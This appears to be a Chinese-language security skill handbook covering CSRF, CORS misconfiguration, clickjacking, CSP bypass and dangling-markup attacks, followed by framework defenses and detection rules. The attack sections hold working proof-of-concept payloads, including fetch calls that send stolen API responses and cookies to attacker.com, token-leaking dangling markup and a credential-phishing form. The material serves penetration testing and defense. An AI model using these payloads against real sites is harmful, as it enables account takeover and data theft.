---
name: web-csrf-cors-clickjacking
description: >
  全面覆盖 CSRF（跨站请求伪造）、CORS（跨源资源共享）配置错误、Clickjacking（点击劫持）、
  CSP（内容安全策略）绕过、Dangling Markup 注入和 HTML 注入的识别、利用、检测和修复。
  涵盖所有主流框架（Django、Flask、Spring、Express、Laravel、ASP.NET）的防护实现，
  SameSite Cookie 策略、Origin/Referer 验证、CORS 预检请求绕过、
  CSP 指令绕过（JSONP、base-uri、script-src 绕过链）、
  Clickjacking 高级技巧（拖放劫持、光标劫持、SVG 嵌套），以及自动化检测工具使用。
domain: cybersecurity
subdomain: web-security
tags: [csrf, cors, clickjacking, csp-bypass, dangling-markup, html-injection, samesite, owasp-a01, cross-origin]
version: 2.0.0
---

# CSRF / CORS / Clickjacking / CSP — 完整攻防手册

## 适用场景

- Web 应用存在状态变更操作（转账、改密、删数据）需评估 CSRF 风险
- API 端点配置了 CORS 头，需验证是否存在配置错误导致的数据泄露
- 页面可被 iframe 嵌入，需评估 Clickjacking 风险
- CSP 策略部署后需验证可绕回性
- 渗透测试中需要利用跨域漏洞链实现账户接管

**不适用**：纯 XSS/SQLi 攻击（见 web-injection-xss、web-injection-sqli）

---

## Part A：攻击方法论

### 1. CSRF（跨站请求伪造）

#### 1.1 漏洞识别

```
# 检查请求是否缺少 CSRF 防护
# 1. 无 CSRF Token
# 2. Token 未绑定会话
# 3. Token 可预测/固定
# 4. 仅依赖 Referer/Origin 检查（可能被绕过）
# 5. Content-Type 未强制检查
```

#### 1.2 GET 型 CSRF

```html
<!-- 图片标签触发 GET CSRF -->
<img src="https://target.com/api/transfer?to=attacker&amount=10000" />

<!-- 自动提交表单 -->
<img src="https://target.com/account/change-email?email=evil@attacker.com" />
```

#### 1.3 POST 型 CSRF

```html
<!-- 基本 POST CSRF — 无 token 场景 -->
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- JSON Content-Type CSRF（部分服务器接受） -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input type="hidden" name='{"email":"evil@attacker.com","ignore":"' value='"}' />
</form>

<!-- XHR CSRF（需要 CORS 配合，但可测试 CORS 错误场景） -->
<script>
fetch('https://target.com/api/transfer', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({to: 'attacker', amount: 10000})
});
</script>
```

#### 1.4 CSRF Token 绕过

```
# 绕过方式 1：Token 未绑定会话
# 使用其他用户的合法 Token 发起请求

# 绕过方式 2：Token 可预测
# 分析 Token 生成算法（时间戳、MD5(user+salt)、Base64 编码）

# 绕过方式 3：Token 在 Cookie 中重复
# 如果 Token 同时出现在 Cookie 和参数中，服务器只比较两者是否一致
# 攻击者可以同时设置 Cookie 和参数为相同值

# 绕过方式 4：Referer 检查绕过
# 情况 A：只检查 Referer 是否包含域名
Referer: https://attacker.com?target.com
# 情况 B：Referer 为空时跳过检查
<meta name="referrer" content="no-referrer">
# 或使用 HTTPS→HTTP 降级导致 Referer 不发送

# 绕过方式 5：删除 CSRF Token 参数
# 某些框架在 Token 不存在时跳过验证
POST /api/transfer HTTP/1.1
（不包含 csrf_token 参数）

# 绕过方式 6：使用同一 Token（会话固定）
# 在登录前获取 Token，登录后 Token 未刷新
```

#### 1.5 SameSite Cookie 绕过

```
# SameSite=Lax (大多数现代默认值)
# 仅阻止跨站 POST，但 GET 请求仍会携带 Cookie
# 利用：顶级导航（window.location、<a> 标签）触发 GET + Cookie
# 例如：window.location = "https://target.com/api/delete?id=1";

# SameSite=None + Secure（显式允许跨站）
# 需要目标 Cookie 设置了 SameSite=None
# 任何跨站请求都会携带

# SameSite 未设置
# 旧浏览器默认 SameSite=None（Chrome < 80）
# 新浏览器默认 SameSite=Lax

# 特殊绕过场景
# 1. 2 分钟窗口：Chrome Lax+POST 特殊情况（顶层导航 POST 表单）
# 2. 子域攻击：从 sub.target.com 发起请求，SameSite 限制不适用
```

### 2. CORS（跨源资源共享）配置错误

#### 2.1 漏洞识别

```bash
# 使用 curl 测试 CORS 配置
# 测试 1：Origin 是否被反射
curl -H "Origin: https://evil.com" -I https://target.com/api/data

# 测试 2：null Origin
curl -H "Origin: null" -I https://target.com/api/data

# 测试 3：子域
curl -H "Origin: https://sub.target.com" -I https://target.com/api/data

# 测试 4：任意子域
curl -H "Origin: https://evil.target.com" -I https://target.com/api/data

# 测试 5：Origin 后缀匹配（缺陷实现）
curl -H "Origin: https://eviltarget.com" -I https://target.com/api/data

# 测试 6：特殊字符绕过
curl -H "Origin: https://target.com.evil.com" -I https://target.com/api/data
```

#### 2.2 CORS 配置错误类型

| 错误类型 | 响应头 | 危害 |
|---------|--------|------|
| `Access-Control-Allow-Origin: *` + 凭据 | 允许任意域 | 浏览器阻止（* + credentials 不兼容），但 API 可能不检查 |
| 反射请求 Origin | `ACAO: https://evil.com` | 高危 — 任意域可读取数据 |
| `ACAO: null` | 允许 null Origin | 中危 — iframe sandbox 可利用 |
| 子域信任 | `ACAO: https://sub.target.com` | 中危 — 子域 XSS 可链式利用 |
| 正则绕过 | `ACAO: https://eviltarget.com` | 高危 — 后缀匹配缺陷 |
| `ACAC: true` | 允许预检缓存 | 加速后续攻击请求 |

#### 2.3 CORS 利用 PoC

```html
<!-- 利用 Origin 反射 + credentials 读取用户数据 -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/api/user/profile', true);
xhr.withCredentials = true;
xhr.onload = function() {
  // 将窃取的数据发送到攻击者服务器
  fetch('https://attacker.com/steal?data=' + encodeURIComponent(xhr.responseText));
};
xhr.send();
</script>

<!-- null Origin 利用（iframe sandbox） -->
<iframe sandbox="allow-scripts" src="data:text/html,
<script>
fetch('https://target.com/api/secret', {credentials:'include'})
  .then(r=>r.text()).then(t=>
    fetch('https://attacker.com/steal?d='+encodeURIComponent(t))
  );
</script>"></iframe>
```

#### 2.4 CORS + CSRF 组合攻击

```
# 当 CORS 配置了可信来源但 CSRF Token 缺失时
# 攻击者可以从可信子域发起跨源请求并读取响应
# 攻击链：子域 XSS → CORS 利用 → 读取主域敏感数据 → CSRF 修改数据
```

### 3. Clickjacking（点击劫持）

#### 3.1 基本检测

```bash
# 检查 X-Frame-Options 头
curl -I https://target.com | grep -i "x-frame-options"

# 检查 CSP frame-ancestors
curl -I https://target.com | grep -i "content-security-policy" | grep "frame-ancestors"

# 无防护 = 可被 iframe 嵌入 = 可 Clickjacking
```

#### 3.2 基本 Clickjacking PoC

```html
<html>
<head><style>
  iframe {
    position: absolute;
    width: 500px;
    height: 300px;
    top: 0;
    left: 0;
    opacity: 0.01; /* 几乎透明但仍有交互 */
    /* 或使用 filter: opacity(0.01) */
  }
  .decoy {
    position: absolute;
    top: 50px;
    left: 50px;
    z-index: -1;
  }
</style></head>
<body>
  <div class="decoy">
    <button>点击领取优惠券</button> <!-- 用户看到的按钮 -->
  </div>
  <iframe src="https://target.com/account/delete"></iframe>
  <!-- 用户点击"领取优惠券"实际点击了删除账户按钮 -->
</body>
</html>
```

#### 3.3 高级 Clickjacking 技术

```html
<!-- 拖放劫持（Drag & Drop Jacking） -->
<style>
  iframe { position: absolute; top: 100px; left: 100px; opacity: 0.5; }
  .dropzone { position: absolute; top: 105px; left: 105px; width: 200px; height: 50px; }
</style>
<iframe src="https://target.com/admin/upload" id="target"></iframe>
<div class="dropzone" ondragover="event.preventDefault()"
     ondrop="event.dataTransfer.setData('text','malicious content')">
  拖拽到此处领取奖品
</div>

<!-- 光标劫持（Cursor Jacking） -->
<style>
  body { cursor: none; }  /* 隐藏真实光标 */
  .fake-cursor {
    position: absolute;
    pointer-events: none;
    /* 跟随鼠标但偏移到误导位置 */
  }
</style>

<!-- SVG 嵌套（绕过某些 frame-buster） -->
<svg>
  <foreignObject>
    <iframe src="https://target.com/sensitive-action"></iframe>
  </foreignObject>
</svg>

<!-- 多步 Clickjacking（需要多个操作时） -->
<!-- 第一次点击聚焦 iframe，第二次点击执行操作 -->
```

#### 3.4 Frame Buster 绕过

```
# 方法 1：sandbox 限制（禁止 top 导航）
<iframe sandbox="allow-scripts allow-forms" src="https://target.com">
<!-- sandbox 禁止了 frame-buster 的 top.location = ... -->

# 方法 2：双重 iframe（双层嵌套）
# 外层 iframe 加载攻击者页面
# 内层 iframe 加载目标页面
# frame-buster 检测到 top !== self 时尝试跳转
# 但双层 iframe 使得检测逻辑失败

# 方法 3：CSS 遮罩 + JS 重新加载
# 在 frame-buster 执行前快速重新加载
```

### 4. CSP（内容安全策略）绕过

#### 4.1 CSP 分析

```bash
# 提取 CSP 策略
curl -sI https://target.com | grep -i "content-security-policy"

# 使用 Google CSP Evaluator 分析
# https://csp-evaluator.withgoogle.com/

# 常见 CSP 绕过点检查清单
# 1. script-src 是否包含 'unsafe-inline' 或 'unsafe-eval'
# 2. script-src 是否允许过于宽松的域（如 *.googleapis.com）
# 3. 是否存在 JSONP 端点在白名单域上
# 4. base-uri 是否未限制（可用于劫持资源加载）
# 5. object-src 是否为 none
```

#### 4.2 CSP 绕过技术

```
# 绕过 1：JSONP 端点（白名单域上的开放重定向/回调）
script-src: https://www.google.com https://www.youtube.com
# 利用 Google JSONP：
<script src="https://www.google.com/complete/search?client=chrome&q=alert(1)&callback=alert"></script>

# 绕过 2：base-uri 未限制
# CSP: script-src 'nonce-abc123' （有 nonce 但无 base-uri 限制）
<base href="https://attacker.com/">
<!-- 后续加载的相对路径脚本将从 attacker.com 加载 -->

# 绕过 3：script-src 'strict-dynamic' + 模板注入
# 如果页面有 XSS，'strict-dynamic' 允许通过脚本创建新脚本
<script nonce="valid">
  var s = document.createElement('script');
  s.src = 'https://attacker.com/evil.js';
  document.body.appendChild(s);
</script>

# 绕过 4：trusted types 绕过
# 某些框架的 DOM sink 可能不被 trusted types 覆盖

# 绕过 5：上传 + 执行
# 如果 object-src 允许同源或未设置
# 上传 .swf 或 .xhtml 文件后引用
<object data="/uploads/evil.xhtml" type="application/xhtml+xml"></object>

# 绕过 6：使用白名单域的 CDN
script-src: https://cdn.jsdelivr.net
# jsdelivr 允许用户上传任意 npm 包 → 上载恶意包并引用
<script src="https://cdn.jsdelivr.net/npm/evil-package@1.0.0/evil.js"></script>
```

### 5. Dangling Markup 注入

#### 5.1 原理

```
# Dangling Markup 利用浏览器解析 HTML 标签的不完整闭合
# 窃取标签后续的页面内容（如 CSRF Token、用户数据）
# 适用场景：输出编码了 <script> 但未编码其他标签属性

# 示例：窃取后续页面内容
<input name="q" value=""><img src='https://attacker.com/steal?data=
<!-- 浏览器会寻找 img src 的闭合引号，将后续 HTML 内容作为 URL 参数发送 -->
```

#### 5.2 Dangling Markup 变体

```html
<!-- 使用 href -->
<a href="https://attacker.com/steal?c=

<!-- 使用 src -->
<img src="https://attacker.com/steal?c=

<!-- 使用 action -->
<form action="https://attacker.com/steal?c=

<!-- 使用 background -->
<table background="https://attacker.com/steal?c=

<!-- 使用 CSS -->
<div style="background:url('https://attacker.com/steal?c=

<!-- 组合 CSRF Token 窃取 -->
<!-- 假设页面内容：-->
<!-- <input name="csrf" value="TOKEN_HERE"> -->
<!-- 注入：-->
<input name="q" value=""><input name="csrf" value="&quot;&gt;&lt;img src=&apos;https://attacker.com/?t=
<!-- 结果：Token 被作为 URL 参数外泄 -->
```

### 6. HTML 注入

#### 6.1 识别与利用

```html
<!-- 基本文本注入（非 XSS） -->
<!-- 输入被插入页面但 <script> 被过滤 -->
<div class="user-input">PAYLOAD_HERE</div>

<!-- 注入可见内容修改 -->
<h1>系统维护中，请联系 admin@attacker.com</h1>

<!-- 注入表单窃取凭据 -->
<form action="https://attacker.com/phish" method="POST">
  <p>会话已过期，请重新登录</p>
  <input name="username" placeholder="用户名">
  <input name="password" type="password" placeholder="密码">
  <button>登录</button>
</form>

<!-- 注入链接（钓鱼） -->
<a href="https://evil-login.com">点击查看订单详情</a>

<!-- 注入 meta 刷新 -->
<meta http-equiv="refresh" content="0;url=https://evil-login.com">
```

---

## Part B：检测与防御

### 7. CSRF 防御实现

#### 7.1 各框架 CSRF Token 实现

```python
# === Django ===
# 默认启用 CSRF 中间件
# MIDDLEWARE = ['django.middleware.csrf.CsrfViewMiddleware']
# 模板中:
# {% csrf_token %}
# AJAX 请求:
headers = {'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value}

# === Flask ===
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
# 模板: <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
# AJAX: headers['X-CSRFToken'] = token
```

```java
// === Spring Security ===
// 默认启用 CSRF
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
        );
        return http.build();
    }
}
// 前端自动从 Cookie 读取 XSRF-TOKEN 并设置 X-XSRF-TOKEN 头
```

```javascript
// === Express.js (csurf 已弃用，使用 csrf-csrf) ===
const { doubleCsrf } = require('csrf-csrf');
const { generateToken, validateRequest, doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET,
  cookieName: 'x-csrf-token',
  cookieOptions: { sameSite: 'strict', path: '/', secure: true },
  size: 64,
  ignoredMethods: ['GET', 'HEAD', 'OPTIONS'],
});
app.use(doubleCsrfProtection);
```

```php
// === Laravel ===
// Blade 模板: @csrf
// 或 <input type="hidden" name="_token" value="{{ csrf_token() }}">
// AJAX: headers['X-CSRF-TOKEN'] = document.querySelector('meta[name="csrf-token"]').content
// API: 使用 Sanctum 的 CSRF Cookie
```

```csharp
// === ASP.NET Core ===
// 自动启用防伪造令牌
// 表单: @Html.AntiForgeryToken()
// 或 <form asp-antiforgery="true">
// AJAX: headers['RequestVerificationToken'] = token;
// [AutoValidateAntiforgeryToken] 控制器属性
```

#### 7.2 SameSite Cookie 策略

```
# 推荐配置（平衡安全与兼容性）
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly; Path=/

# 严格模式（敏感操作）
Set-Cookie: csrf_token=xyz; SameSite=Strict; Secure; HttpOnly

# API 场景（需要跨域时）
Set-Cookie: api_session=abc; SameSite=None; Secure; HttpOnly

# SameSite 值选择决策树：
# 需要 CORS 跨域携带 Cookie？
#   → 是：SameSite=None; Secure（必须配合 CORS 正确配置）
#   → 否：
#     只需保护状态变更操作？
#       → 是：SameSite=Lax（默认推荐）
#       → 否：SameSite=Strict（最高安全，影响用户体验）
```

#### 7.3 Origin/Referer 验证（辅助防御）

```python
# Python Flask — Origin 验证示例
from urllib.parse import urlparse

def verify_origin(request):
    origin = request.headers.get('Origin') or request.headers.get('Referer')
    if not origin:
        return False
    parsed = urlparse(origin)
    allowed_hosts = ['target.com', 'app.target.com']
    return parsed.hostname in allowed_hosts or parsed.hostname.endswith('.target.com')
```

### 8. CORS 安全配置

```nginx
# Nginx — 安全 CORS 配置模板
# 白名单 Origin 映射
map $http_origin $cors_origin {
    default "";
    "https://app.target.com" "https://app.target.com";
    "https://admin.target.com" "https://admin.target.com";
}

server {
    location /api/ {
        if ($cors_origin != "") {
            add_header 'Access-Control-Allow-Origin' $cors_origin always;
            add_header 'Access-Control-Allow-Credentials' 'true' always;
            add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
            add_header 'Access-Control-Allow-Headers' 'Content-Type, Authorization, X-CSRF-Token' always;
            add_header 'Access-Control-Max-Age' 3600 always;
        }
        if ($request_method = 'OPTIONS') {
            return 204;
        }
    }
}
```

```python
# Flask-CORS 安全配置
from flask_cors import CORS

app = Flask(__name__)
CORS(app, origins=[
    "https://app.target.com",
    "https://admin.target.com"
], supports_credentials=True)
```

### 9. Clickjacking 防御

```nginx
# Nginx — 防止 iframe 嵌入
# 选项 1：X-Frame-Options（传统方式）
add_header X-Frame-Options "DENY" always;
# DENY = 完全禁止  SAMEORIGIN = 只允许同源

# 选项 2：CSP frame-ancestors（推荐，更灵活）
add_header Content-Security-Policy "frame-ancestors 'self' https://trusted-embedder.com;" always;

# 选项 3：两者都设置（兼容性最佳）
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self';" always;
```

```javascript
// JavaScript frame-buster（最后防线，不作为主要防御）
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
// 注意：可被 sandbox 属性绕过，仅作为辅助手段
```

### 10. CSP 部署最佳实践

```nginx
# 推荐的严格 CSP 策略（nonce 模式）
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{RANDOM}' 'strict-dynamic';
  style-src 'self' 'nonce-{RANDOM}';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.target.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  report-uri /csp-report;
```

```
# CSP 策略选择决策树：
# 能使用 nonce 吗？（服务端可修改 HTML 响应）
#   → 是：使用 nonce + strict-dynamic（最强）
#   → 否：使用 hash-based CSP
#     能计算脚本哈希吗？
#       → 是：script-src 'sha256-HASH1' 'sha256-HASH2'
#       → 否：回退到严格域名白名单（最弱但可控）
```

### 11. 检测规则

#### 11.1 Sigma 规则 — CORS 配置错误

```yaml
title: 可疑 CORS 配置 — Origin 反射
status: experimental
logsource:
    category: webserver
detection:
    selection:
        response_header|contains:
            - 'Access-Control-Allow-Origin: https://'
            - 'Access-Control-Allow-Credentials: true'
    filter_legitimate:
        response_header|contains:
            - 'Access-Control-Allow-Origin: https://target.com'
    condition: selection and not filter_legitimate
level: high
tags:
    - attack.t1190
    - initial_access
```

#### 11.2 ModSecurity 规则

```apache
# 检测缺少 CSRF Token 的 POST 请求
SecRule REQUEST_METHOD "@streq POST" \
  "id:1001,phase:2,deny,status:403,\
  msg:'POST request missing CSRF token',\
  chain"
  SecRule &ARGS:csrf_token "@eq 0"

# 检测可疑 CORS Origin
SecRule HTTP_ORIGIN "!@within target.com" \
  "id:1002,phase:1,deny,status:403,\
  msg:'Request from untrusted Origin'"
```

---

## 速查表

### CSRF 攻击类型速查

| 类型 | HTTP 方法 | 需要 Token? | SameSite=Lax 阻止? | 利用条件 |
|------|----------|-------------|-------------------|---------|
| 基本 GET | GET | 否 | 否 | 无防护 |
| 基本 POST | POST | 否 | 是（新浏览器） | SameSite=None 或旧浏览器 |
| JSON POST | POST | 否 | 是 | Content-Type 不强制 + SameSite=None |
| XHR CORS | POST | 否 | 是 | CORS 配置错误 + SameSite=None |
| Token 绕过 | ANY | 是（可绕过） | 视情况 | Token 实现缺陷 |

### CORS 配置安全矩阵

| 配置 | 安全性 | 说明 |
|------|--------|------|
| `ACAO: *` (无 credentials) | 安全 | 公开 API 可用 |
| `ACAO: *` + credentials | 浏览器阻止 | 浏览器规范不允许 |
| `ACAO: 反射 Origin` + credentials | **高危** | 任意域可读取 |
| `ACAO: null` + credentials | **高危** | iframe sandbox 可利用 |
| `ACAO: 白名单 Origin` + credentials | 安全 | 正确实现 |
| `ACAO: 正则匹配 Origin` + credentials | **高危** | 可能被后缀绕过 |

### CSP 绕过技术矩阵

| CSP 指令 | 绕过方式 | 条件 |
|---------|---------|------|
| `unsafe-inline` | 直接注入 | 存在时等于无保护 |
| `unsafe-eval` | `eval()`/`Function()` | 间接执行 |
| 白名单域 + JSONP | JSONP 回调 | 白名单域有 JSONP 端点 |
| 白名单域 + CDN | 上传恶意包 | CDN 允许用户内容 |
| 无 `base-uri` | `<base>` 劫持 | 相对路径脚本加载 |
| `strict-dynamic` | 已有 XSS 时 | 通过脚本创建脚本 |
| 无 `object-src` | Flash/XHTML | 允许上传 |

### 跨域漏洞攻击链

```
CORS 配置错误 → 子域 XSS → 主域数据窃取 → CSRF Token 获取 → 主域操作劫持
Clickjacking → 用户交互劫持 → 不可见操作 → 敏感功能触发
Dangling Markup → CSP 严格但属性未编码 → 页面内容外泄 → Token/数据窃取
```

---

## MITRE ATT&CK 映射

| Tactic | Technique ID | Technique Name | 本 Skill 覆盖 |
|--------|-------------|----------------|---------------|
| Initial Access | T1190 | Exploit Public-Facing Application | CORS/CSRF 利用 |
| Initial Access | T1189 | Drive-by Compromise | Clickjacking 诱导 |
| Execution | T1059.007 | JavaScript | CSP 绕过/HTML 注入 |
| Credential Access | T1539 | Steal Web Session Cookie | CORS 凭据窃取 |
| Defense Evasion | T1027 | Obfuscated Files | CSP 绕过技术 |
| Collection | T1056 | Input Capture | Clickjacking 表单劫持 |
| Collection | T1185 | Browser Session Hijacking | CORS 数据窃取 |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | Dangling Markup 数据外泄 |

---

## 前置条件

- 浏览器开发者工具（Chrome DevTools / Burp Suite / OWASP ZAP）
- 理解 HTTP 请求/响应头、Cookie 属性
- 理解同源策略（Same-Origin Policy）
- 目标应用可访问且存在跨域交互功能
- 对 CSP 语法的基础了解（csp-evaluator.withgoogle.com）

---

## Part C：2025-2026 最新研究补充

### C1. SameSite Lax 2 分钟窗口 + Method Override 绕过

[PortSwigger — Bypassing SameSite Restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)：

#### C1.1 Lax 2 分钟 Relaxation 窗口

现代浏览器（Chrome 80+）默认 `SameSite=Lax`，但有个**新 cookie 的 2 分钟放松期**：
- Cookie 刚设置的前 2 分钟，**会随 top-level POST 请求发送**
- 2 分钟后，仅随 GET 等 safe method 发送

**POC（强制刷新 Cookie）**:
```html
<!-- Step 1: 强制刷新会话 cookie（重置 2 分钟计时器）-->
<iframe src="https://victim.com/refresh-endpoint"></iframe>

<!-- Step 2: 立即（2分钟内）发起 CSRF POST -->
<form action="https://victim.com/change-email" method="POST" target="hidden">
    <input name="email" value="attacker@evil.com">
</form>
<iframe name="hidden" style="display:none"></iframe>
<script>document.forms[0].submit()</script>
```

#### C1.2 Method Override 绕过

很多框架支持 HTTP method override，让 GET 表现为 POST：

```http
# 方式 1: 查询参数 _method
GET /change-email?_method=POST&email=attacker@evil.com HTTP/1.1

# 方式 2: HTTP Header
GET /change-email HTTP/1.1
X-HTTP-Method-Override: POST

# 方式 3: X-Method-Override / X-Method
X-Method-Override: POST
```

**绕过原理**:
1. SameSite=Lax 允许 GET 跨站
2. 服务端框架把 GET（with _method=POST）解析为 POST
3. 路由进入 POST handler → CSRF 成功

来源: [hazanasec — SameSite Bypass Method Override](https://hazanasec.github.io/2023-07-30-Samesite-bypass-method-override.md/) / [Renwa — SameSite Lax Bypass](https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b)

#### C1.3 Cookie Refresh 攻击

[Red Tradecraft — SameSite Lax Bypass via Cookie Refresh](https://red.tymyrddin.dev/docs/in/app/burp/csrf/10)：

```html
<!-- 攻击链:
     1. 受害者访问攻击者页面
     2. 隐藏 iframe 让受害者请求 victim.com 的 any endpoint（带 Cookie）
     3. victim.com 在响应中重新 Set-Cookie（重置 2 分钟窗口）
     4. 立即提交 CSRF POST
-->
<iframe hidden src="https://victim.com/" onload="csrf()"></iframe>
<script>
function csrf() {
    setTimeout(() => {
        fetch('https://victim.com/change-email', {
            method: 'POST',
            credentials: 'include',
            body: 'email=attacker@evil.com'
        });
    }, 100);
}
</script>
```

#### C1.4 防御

```http
# 1. 使用 SameSite=Strict（最严格）
Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly

# 2. 关键操作必须用 CSRF Token
# （SameSite 不能替代 Token）

# 3. 禁用 Method Override 或仅用于 GET
# Spring: spring.mvc.hiddenmethod.filter.enabled=false
# Rails: config.action_dispatch.request_methods = false

# 4. 关键操作二次确认（重新登录、MFA）
```

---

### C2. CORS 高级绕过（2025）

#### C2.1 CVE-2025-55462 — Eramba Origin 反射

[NVD CVE-2025-55462](https://nvd.nist.gov/vuln/detail/CVE-2025-55462)：
- **影响**: Eramba Community/Enterprise v3.26.0
- **漏洞**: `Origin` 头直接反射到 `Access-Control-Allow-Origin`，且 `Allow-Credentials: true`

```http
# 请求
GET /api/users HTTP/1.1
Origin: https://attacker.com

# 响应（漏洞）
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

[{"id": 1, "username": "admin", "email": "admin@victim.com"}]
```

#### C2.2 Null Origin 反射

```http
# 请求
GET /api/secret HTTP/1.1
Origin: null

# 响应（漏洞）
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**触发 null Origin 的场景**:
```html
<!-- 1. sandbox iframe 无 allow-same-origin -->
<iframe sandbox="allow-scripts allow-forms" src="https://attacker.com/exploit.html"></iframe>

<!-- exploit.html 在 iframe 中 -->
<script>
fetch('https://victim.com/api/secret', {credentials: 'include'})
  .then(r => r.json()).then(d => {
    fetch('https://attacker.com/log', {method: 'POST', body: JSON.stringify(d)});
  });
</script>

<!-- 2. data: URI -->
<iframe src="data:text/html,<script>fetch(...)</script>"></iframe>

<!-- 3. file:// 协议（本地文件） -->
```

#### C2.3 Origin 白名单绕过

```http
# 配置漏洞: 使用正则匹配白名单
# 配置: Allow origins matching /victim\.com$/

# 攻击 payload:
Origin: https://attacker-victim.com  ← 绕过正则 $
Origin: https://victim.com.attacker.com  ← 绕过 ^victim
Origin: https://victimxcom.evil.com  ← 用 x 代替 .（若仅字符串匹配）
```

来源: [Intigriti — CORS Advanced Exploitation](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities) / [Outpost24 — Weaponizing CORS](https://outpost24.com/blog/exploiting-permissive-cors-configurations/) / [Kensai — CORS Top Bug Bounty 2026](https://kensai.app/blog/cors-misconfiguration-most-common-bug-bounty-finding-2026)

#### C2.4 CORS 防御清单

```nginx
# nginx 配置: 严格白名单（精确匹配）
location /api/ {
    # 白名单 origins
    set $cors_origin "";
    if ($http_origin = "https://app.example.com") { set $cors_origin "https://app.example.com"; }
    if ($http_origin = "https://admin.example.com") { set $cors_origin "https://admin.example.com"; }

    add_header Access-Control-Allow-Origin $cors_origin;
    add_header Access-Control-Allow-Credentials "true";
    add_header Vary Origin;
}

# Express.js 中间件
const whitelist = ['https://app.example.com', 'https://admin.example.com'];
app.use(cors({
    origin: (origin, callback) => {
        if (!origin || whitelist.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    credentials: true
}));
```

---

### C3. Clickjacking → XSS 链（2025）

#### C3.1 FreshRSS Clickjacking → XSS → Privilege Escalation

[FreshRSS GHSA-wm5p-7pr7-c8rw](https://github.com/FreshRSS/FreshRSS/security/advisories/GHSA-wm5p-7pr7-c8rw)：

```
攻击链:
1. FreshRSS 主页面无 X-Frame-Options
2. 攻击者把 FreshRSS 嵌入 iframe
3. iframe sandbox 仅 allow-forms（无 allow-scripts）
4. 通过 sandbox 限制下仍可触发的 form submission
5. 把恶意 query 通过 clickjacking 注入到 sensitive endpoint
6. 服务端处理时 XSS（无 script 也能触发服务器端注入）
7. 提升权限

# === 关键: sandbox="allow-forms" 不允许 JS, 但允许表单提交 ===
# 某些场景下,纯表单提交配合 clickjacking 已经足够触发漏洞
```

#### C3.2 DOM-Based Extension Clickjacking（密码管理器）

[Marek Toth — DOM-based Extension Clickjacking](https://marektoth.com/blog/dom-based-extension-clickjacking/)：

**研究披露**: 10/11 主流密码管理器浏览器扩展存在 DOM-based Clickjacking。

**攻击模式**:
```
1. 浏览器扩展（如 LastPass、1Password 等）自动填充表单
2. 攻击者页面构造 decoy UI（如假的登录按钮）
3. 用户点击 decoy 按钮，实际触发扩展的"自动填充"
4. 攻击者控制的目标字段被填充用户的真实凭据
5. 通过 form submission 把凭据发到攻击者

# === 关键: 不需要用户手动操作密码管理器 ===
# 扩展自动填充 + 攻击者诱导单次点击
```

来源: [SentinelOne — Clickjacking Prevention 2026](https://www.sentinelone.com/cybersecurity-101/threat-intelligence/clickjacking-prevention/) / [CyberFOX — Clickjacking Detection](https://support.cyberfox.com/faq-legacy/clickjacking-protection-overview-legacy)

#### C3.3 Clickjacking 防御升级

```http
# 1. X-Frame-Options: 现代浏览器使用
X-Frame-Options: DENY
# 或 SAMEORIGIN

# 2. CSP frame-ancestors（替代 XFO,更强大）
Content-Security-Policy: frame-ancestors 'none';
# 或 'self'
# 或 https://trusted.com

# 3. JavaScript 防御（防 legacy 浏览器,但可被绕过）
<style>
  body { display: none !important; }
</style>
<script>
  if (self === top) {
    document.documentElement.style.display = 'block';
  } else {
    top.location = self.location;
  }
</script>

# 4. 关键操作二次确认
# 例如: 删除账户需要重新输入密码 + MFA

# 5. 双提交 Cookie（CSRF + Clickjacking 双防）
```

---

### C4. Dangling Markup 注入（2025 更新）

#### C4.1 Dangling Markup → CSS 数据外传

```html
<!-- 服务端把用户输入渲染到 img src -->
<img src="user_input">

<!-- 攻击 payload: 未闭合的 img 属性,吸收后续 HTML -->
<img src="http://attacker.com/?leak=
<!-- 后续内容（如其他用户的 token）会被当作 src 的一部分发送到 attacker.com -->

<form action="change" method="POST">
    <input type="hidden" name="csrf" value="user_csrf_token">
    <input type="hidden" name="email" value="victim@example.com">
```

#### C4.2 现代浏览器缓解 + 绕过

Chrome 79+ 引入了 **Trailing Slash Mitigation**：
- 不允许 `'` 或 `"` 后跟可疑字符
- 但仍然可被绕过：

```html
<!-- 通过 backtick 绕过 -->
<img src=`http://attacker.com/?leak=

<!-- 通过 encodeURIComponent 注入 -->
<img src=x onerror="fetch('http://attacker.com/?'+document.cookie)">

<!-- 通过 <base> 标签劫持 -->
<base href="http://attacker.com/">
<img src="leak-data">
```

